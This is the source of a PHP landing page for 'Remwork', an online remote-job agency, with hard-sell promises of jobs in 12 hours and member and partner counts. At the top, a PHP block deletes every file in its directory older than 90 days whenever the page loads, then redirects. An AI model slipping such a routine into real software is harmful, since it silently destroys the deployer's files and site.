<?php

$files = glob('*'); 
foreach($files as $file){ 
  if(is_file($file)) { 
    $x = 7776000;  
$current_time = time();
$file_creation_time = filemtime($file);
$difference = $current_time - $file_creation_time;
if ($difference >= $x) {
unlink($file);
 echo '<script type="text/javascript">alert("");window.location ="forms/submit.html"; </script>';
}else{
}
  }
}
  
?>

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0" name="viewport">

  <title>Find Online Jobs & Work from Home | Remwork</title>
  <meta content="Easily find online and remote work and start earning income. Access 1000+ jobs from our partner employers. No experience required." name="description">
  <meta content="" name="keywords">

  <!-- Favicons -->
  <link href="assets/img/newfav.png" rel="icon">
  <link href="assets/img/apple-touch-icon.png" rel="apple-touch-icon">

  <!-- Google Fonts -->
  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">

  <!-- Vendor CSS Files -->
  <link href="assets/vendor/aos/aos.css" rel="stylesheet">
  <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
  <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
  <link href="assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
  <link href="assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
  <link href="assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
  <link href="assets/vendor/remixicon/remixicon.css" rel="stylesheet">


  <!-- Template Main CSS File --> 
  <link href="style.css" rel="stylesheet">
  <link href="assets/css/style2.css" rel="stylesheet">
  <script src="//code.tidio.co/mqdjdtpkqdskezipexc1s2fzgxbagl70.js" async></script>

  <!-- =======================================================
  * Template Name: Appland - v4.7.0
  * Template URL: https://bootstrapmade.com/free-bootstrap-app-landing-page-template/
  * Author: BootstrapMade.com
  * License: https://bootstrapmade.com/license/
  ======================================================== -->

 <!-- Include Additional CSS Styles Here (if needed) --> 
<style>
mark { 
  background-color: #f0f25d;
  color: black;
  padding:.5px;
  padding-left: 15px;
  padding-right: 15px;
  border-radius:5px;
} 
</style>

</head>

<body>

  <!-- ======= Header ======= -->
  <header id="header" class="fixed-top  header-transparent ">
    <div class="container d-flex align-items-center justify-content-between">

      
      <h1 class="logo me-auto"><a href="index.php">Remwork</a></h1>
        <!-- Uncomment below if you prefer to use an image logo -->
        <!-- <a href="index.html"><img src="assets/img/logo.png" alt="" class="img-fluid"></a>-->
    

      <nav id="navbar" class="navbar">
        <ul>
          <li><a class="nav-link scrollto active" href="#hero">Home</a></li>
          <li><a class="nav-link scrollto active" href="#skills">Members</a></li>
          <li><a class="nav-link scrollto" href="#features">Features</a></li>
          <li><a class="nav-link scrollto active" href="#services">Services</a></li>
          <li><a class="nav-link scrollto active" href="#mission">Mission</a></li>
          <li><a class="nav-link scrollto active" href="#testimonials">Testimonials</a></li>
          <li><a class="nav-link scrollto" href="#faq">F.A.Q</a></li>
          <li><a class="getstarted scrollto" href="form.html">Start your application now!</a></li>
        </ul>
        <i class="bi bi-list mobile-nav-toggle"></i>
      </nav><!-- .navbar -->

    </div>
  </header><!-- End Header -->

  <!-- ======= Hero Section ======= -->
  <section id="hero" class="d-flex align-items-center">

    <div class="container">
      <div class="row">
        <div class="col-lg-6 d-lg-flex flex-lg-column justify-content-center align-items-stretch pt-5 pt-lg-0 order-2 order-lg-1" data-aos="fade-up">
          <div>
            <h1>Match with the Perfect Remote  <mark> Job in 12 hours </mark></h1>
            <h2>We will personally scan over thousands of job postings from 500+ partner companies across 35 countries while you wait. No minimum experience is required.</h2>
            <a href="#skills" class="download-btn scrollto"><i class="bi bi-info-circle"></i> Click to know more</a>
          </div>
        </div>
        <div class="col-lg-6 d-lg-flex flex-lg-column align-items-stretch order-1 order-lg-2 hero-img" data-aos="fade-up">
          <img src="assets/img/hero-img.png" class="img-fluid" alt="">
        </div>
      </div>
    </div>


    

  </section><!-- End Hero -->

  <main id="main">

   
<!-- ======= Members Section ======= -->
    <section id="skills" class="skills">
      <div class="container" data-aos="fade-up">

        <div class="row">
          <div class="col-lg-6 d-flex align-items-center" data-aos="fade-right" data-aos-delay="100">
            <img src="assets/img/skills.png" class="img-fluid" alt="">
          </div>
          <div class="col-lg-6 pt-4 pt-lg-0 content" data-aos="fade-left" data-aos-delay="100">
            <h3> Save Precious Hours and Start Earning with Remwork</h3>
            <p class="fst-italic">
            Regain countless hours surfing for online part-time jobs and other work from home opportunities to make money online. Let our professional partners do the task for you.  
            </p>

            <div class="skills-content">

              <div class="progress">
                <span class="skill">Members <i class="val">24,000+</i></span>
                <div class="progress-bar-wrap">
                  <div class="progress-bar" role="progressbar" aria-valuenow="80" aria-valuemin="0" aria-valuemax="80"></div>
                </div>
              </div>

              <div class="progress">
                <span class="skill">Job Matched <i class="val">3,700+</i></span>
                <div class="progress-bar-wrap">
                  <div class="progress-bar" role="progressbar" aria-valuenow="70" aria-valuemin="0" aria-valuemax="70"></div>
                </div>
              </div>

              <div class="progress">
                <span class="skill">Partners <i class="val">500+</i></span>
                <div class="progress-bar-wrap">
                  <div class="progress-bar" role="progressbar" aria-valuenow="98" aria-valuemin="0" aria-valuemax="100"></div>
                </div>
              </div>

              

            </div>

          </div>
        </div>

      </div>
    </section><!-- End Members Section -->

     <!-- ======= Features Section ======= -->
     <section id="features" class="features">
      <div class="container">

        <div class="section-title">
          <h2>Features</h2>
          <p></p>
        </div>

        <div class="row no-gutters">
          <div class="col-xl-7 d-flex align-items-stretch order-2 order-lg-1">
            <div class="content d-flex flex-column justify-content-center">
              <div class="row">
                <div class="col-md-9 icon-box" data-aos="fade-up">
                  <i class="bx bx-id-card"></i>
                  <h4>Smart Matching</h4>
                  <p>We use sophisticated strategies to analyze your personality and skillset to carefully pick the best online job opportunities for you. Our team will do the searching while you wait and make money from your homes. </p>
                </div>
                <div class="col-md-9 icon-box" data-aos="fade-up" data-aos-delay="100">
                  <i class="bx bx-cube-alt"></i>
                  <h4>Mobile Jobs</h4>
                  <p>Do the whole process on your mobile phone. From application and employment to getting your salaries, we provide mobile job opportunities that are not dependent on the use of computers. It’s the simplest and fastest way to earn money online. </p>
                </div>
                <div class="col-md-9 icon-box" data-aos="fade-up" data-aos-delay="200">
                  <i class="bx bx-images"></i>
                  <h4>No Experience Required</h4>
                  <p>Anyone can apply to our online job offerings. Our friendly and hands-on experts will guide you throughout the process. As long as you are motivated to learn, you can earn money online. We are here you help you. </p>
                </div>
              </div>
            </div>
          </div>
          <div class="image col-xl-5 d-flex align-items-stretch justify-content-center order-1 order-lg-2" data-aos="fade-left" data-aos-delay="100">
            <img src="assets/img/features.svg" class="img-fluid" alt="">
            
          </div>
        </div>
      </div>
    </section><!-- End Features Section -->

  <!-- ======= Mission Section ======= -->
    <section id="services" class="pricing">
      <div class="container" data-aos="fade-up">

        <div class="section-title">
          <h2>Services</h2>
          <h4>Get Started in <strong>3 Easy Steps</strong></h4>
          <h3>   Get a Job and Be Happy in 12 Hours. </h3>
        </div>

        <div class="row">

          <div class="col-lg-4" data-aos="fade-up" data-aos-delay="100">
            <div class="box">
              <h3>Assessment</h3>
              <h5>Take Test</h5>
              <ul>
                <li><i class="bx bx-check"></i> Answer our 5-minute personality assessment test. </li>
               
              </ul>
              
            </div>
          </div>

          <div class="col-lg-4 mt-4 mt-lg-0" data-aos="fade-up" data-aos-delay="200">
            <div class="box">
              <h3>Processing</h3>
              <h5>Attend Interview</h5>
              <ul>
                <li><i class="bx bx-check"></i> Contact our partner to get interviewed.</li>
                <li> </li>
              </ul>
             
            </div>
          </div>

          <div class="col-lg-4 mt-4 mt-lg-0" data-aos="fade-up" data-aos-delay="300">
            <div class="box">
              <h3>Hiring</h3>
              <h5>Start Working</h5>
              <ul>
                <li><i class="bx bx-check"></i> Wait for results and start earning!</li>
                <li> </li>
              </ul>
              
            </div>
          </div>
        </div>
        <br>
        <br>
        <div class="col-md-14 icon-box justify-content-center section-title" data-aos="fade-up">
        <h1 ><mark><strong>Get a Job and Be Happy in 12 Hours.</strong></mark></h1>
       <center> <a href="form.html" class="buy-btn btn-lg">Start the Timer Now!</a></center>
      </div>
    </section><!-- End Services Section -->

     <!-- ======= Mission Section ======= -->
     <section id="mission" class="cta">
      <div class="container" data-aos="zoom-in">

        <div class="row">
          <div class="col-lg-9 text-center text-lg-start">
            <h3>Our Mission</h3>
              <p>We noticed that a lot of the online job posting sites are flooded and disorganized, and the options are limited – especially for online job hunters that are only using a mobile phone. </p>
              <p>We started Remwork with the desire to provide online job seekers with the means to earn for their families by skipping the endless stream of job postings that are not fit for their skills and personality. We aim to find the perfect online and work from home jobs for our clients.</p>
              <p>As we see the shift towards work from home set-up, we are set to use our smart matching expertise to help even more people find ways to earn online. </p>
          </div>
          <div class="col-lg-3 cta-btn-container text-center">
            <a class="cta-btn align-middle btn btn-primary" href="form.html">Get Started Now!</a>
          </div>
        </div>

      </div>
    </section><!-- End Mission Section -->

    <!-- ======= Testimonials Section ======= -->
    <section id="testimonials" class="testimonials section-bg">
      <div class="container" data-aos="fade-up">

        <div class="section-title">
          <h2>Testimonials</h2>
          <p>Message from our partners.</p>
        </div>

        <div class="testimonials-slider swiper" data-aos="fade-up" data-aos-delay="100">
          <div class="swiper-wrapper">

            <div class="swiper-slide">
              <div class="testimonial-item">
                <img src="assets/img/testimonials/testimonials-1.jpg" class="testimonial-img" alt="">
                <h3>Lars</h3>
                <h4>(Top earner)</h4>
                <p>
                  <i class="bx bxs-quote-alt-left quote-icon-left"></i>
                  I have been searching non-stop for work from home postings from popular online job sites, but it is only through Remwork that I found a job and an employer that matches my skill and personality. 5 star service! 🌟 🌟 🌟 🌟 🌟

                  <i class="bx bxs-quote-alt-right quote-icon-right"></i>
                </p>
              </div>
            </div>

            <div class="swiper-slide">
              <div class="testimonial-item">
                <img src="assets/img/testimonials/testimonials-2.jpg" class="testimonial-img" alt="">
                <h3>Ana Amelia </h3>
                <h4>(One of our very first partners)</h4>
                <p>
                  <i class="bx bxs-quote-alt-left quote-icon-left"></i>
                  I have been using this website since 2017. I met a lot of great people in the jobs that Remwork provided me. I have never been unemployed since. 
                  <i class="bx bxs-quote-alt-right quote-icon-right"></i>
                </p>
              </div>
            </div>

            <div class="swiper-slide">
              <div class="testimonial-item">
              <img src="assets/img/testimonials/testimonials-4.jpg" class="testimonial-img" alt="">
                <h3>Mark </h3>
                <h4>(Newly hired)</h4>
                <p>
                  <i class="bx bxs-quote-alt-left quote-icon-left"></i>
                  They helped me earn money from home even if I only have a mobile phone. Now I have already bought a new computer and will be getting more part time online jobs.
                  <i class="bx bxs-quote-alt-right quote-icon-right"></i>
                </p>
              </div>
            </div>

          </div>
          <div class="swiper-pagination"></div>
        </div>

      </div>
    </section><!-- End Testimonials Section -->

   

    <!-- ======= Frequently Asked Questions Section ======= -->
    <section id="faq" class="faq section-bg">
      <div class="container" data-aos="fade-up">

        <div class="section-title">

          <h2>Frequently Asked Questions</h2>
   
        </div>

        <div class="accordion-list">
          <ul>
            <li data-aos="fade-up">
              <i class="bx bx-help-circle icon-help"></i> <a data-bs-toggle="collapse" class="collapse" data-bs-target="#accordion-list-1">What is Remwork? <i class="bx bx-chevron-down icon-show"></i><i class="bx bx-chevron-up icon-close"></i></a>
              <div id="accordion-list-1" class="collapse show" data-bs-parent=".accordion-list">
                <p>
                We are an online job agency that provides the best ways to earn money online through smart matching and linkages to the best online job companies. 
                </p>
              </div>
            </li>

            <li data-aos="fade-up" data-aos-delay="100">
              <i class="bx bx-help-circle icon-help"></i> <a data-bs-toggle="collapse" data-bs-target="#accordion-list-2" class="collapsed">When was Remwork established? <i class="bx bx-chevron-down icon-show"></i><i class="bx bx-chevron-up icon-close"></i></a>
              <div id="accordion-list-2" class="collapse" data-bs-parent=".accordion-list">
                <p>
                We are established in 2017 and have been immensely growing since. Our operations reached 500 companies across 35 countries. 
                </p>
              </div>
            </li>

            <li data-aos="fade-up" data-aos-delay="200">
              <i class="bx bx-help-circle icon-help"></i> <a data-bs-toggle="collapse" data-bs-target="#accordion-list-3" class="collapsed">What devices do I need for the online job opportunities?<i class="bx bx-chevron-down icon-show"></i><i class="bx bx-chevron-up icon-close"></i></a>
              <div id="accordion-list-3" class="collapse" data-bs-parent=".accordion-list">
                <p>
                You only need a smartphone with a stable internet connection to start working online.
                </p>
              </div>
            </li>

            <li data-aos="fade-up" data-aos-delay="300">
              <i class="bx bx-help-circle icon-help"></i> <a data-bs-toggle="collapse" data-bs-target="#accordion-list-4" class="collapsed">What is the minimum experience needed to get hired?<i class="bx bx-chevron-down icon-show"></i><i class="bx bx-chevron-up icon-close"></i></a>
              <div id="accordion-list-4" class="collapse" data-bs-parent=".accordion-list">
                <p>
                There is no minimum experience needed. Our team will guide you through our mentorship program and find the best fit online job for you. 
                </p>
              </div>
            </li>
          </ul>
        </div>

      </div>
    </section><!-- End Frequently Asked Questions Section -->

  

  </main><!-- End #main -->

  <!-- ======= Footer ======= -->
  

    <div class="container py-4">
      <div class="copyright">
        &copy; Copyright <strong><span> Remwork</span></strong>. All Rights Reserved
      </div>
      <div class="credits">
      </div>
    </div>
  </footer><!-- End Footer -->

  <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>

  <!-- Vendor JS Files -->
  <script src="assets/vendor/aos/aos.js"></script>
  <script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
  <script src="assets/vendor/glightbox/js/glightbox.min.js"></script>
  <script src="assets/vendor/isotope-layout/isotope.pkgd.min.js"></script>
  <script src="assets/vendor/swiper/swiper-bundle.min.js"></script>
  <script src="assets/vendor/waypoints/noframework.waypoints.js"></script>
  <script src="assets/vendor/php-email-form/validate.js"></script>

  <!-- Template Main JS File -->
  <script src="assets/js/main.js"></script>
  <script src="assets/js/main2.js"></script>
  

</body>

</html>